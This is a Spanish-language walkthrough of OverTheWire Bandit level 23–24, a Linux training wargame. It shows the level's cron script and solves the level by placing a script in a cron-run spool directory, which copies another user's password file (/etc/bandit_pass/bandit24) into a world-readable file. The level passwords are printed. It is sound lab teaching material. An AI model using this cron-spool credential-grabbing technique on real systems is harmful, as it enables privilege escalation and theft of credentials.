# Level 23 - 24
---
## Objetivo 

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel 

```
Server  : **bandit.labs.overthewire.org**
User    : **bandit23**
Pasword : **QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G**
Puerto  : 2220 
```

---
## Solución 

**Primero se accede al servidor**
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
**Contraseña de usuario**
```
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

**Después se hace lo siguiente en la consola**

```bash
ls -la /etc/cron.d
# -rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
# -rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
# -rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
# -rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
cat /etc/cron.d/cronjob_bandit24
# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
cat /usr/bin/cronjob_bandit24.sh
# #!/bin/bash
# myname=$(whoami)
# cd /var/spool/$myname/foo || exit 1
# echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
# for i in * .*;
# do
#    if [ "$i" != "." -a "$i" != ".." ];
#    then
#        echo "Handling $i"
#        owner="$(stat --format "%U" ./$i)"
#        if [ "${owner}" = "bandit23" ]; then
#            timeout -s 9 60 ./$i
#        fi
#        rm -rf ./$i
#    fi
# done

mkdir /tmp/rbctir
cd /tmp/rbctir
echo "cat /etc/bandit_pass/bandit24 > /tmp/rbctir/password" > ctir.sh
cat ctir.sh
# cat /etc/bandit_pass/bandit24 > /tmp/rbctir/password
chmod +x ctir.sh
touch password
chmod 666 password
cp ctir.sh /var/spool/bandit24/foo
cat password
```

**Resultado final**

``` bash
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

---
## Notas Adicionales 

|**Comando** | **Descripción** |
|:---------:|:-------------|
| CP |sirve para copiar un archivo o carpeta trabajando en la línea de comandos|
|chmod| se usa para cambiar el modo de acceso de un archivo.
|touch| se usa principalmente para crear archivos vacíos y cambiar marcas de tiempo de archivos o carpetas.
|mkdir | sirve para crear nuevos directorios 

---
## Referencias 
[Comando cp de Linux. Un par de trucos útiles – Victorhck in the free world](https://victorhckinthefreeworld.com/2017/07/06/comando-cp-de-linux-un-par-de-trucos-utiles/)
[Comando chmod en Linux con ejemplos – Barcelona Geeks](https://barcelonageeks.com/comando-chmod-en-linux-con-ejemplos/)
[Cómo Usar El Comando Touch De Linux + Ejemplos (hostinger.es)](https://www.hostinger.es/tutoriales/usar-comando-touch-linux-ejemplos)
[Cómo usar el comando mkdir y rmdir (ayudalinux.com)](https://ayudalinux.com/como-usar-el-comando-mkdir/)
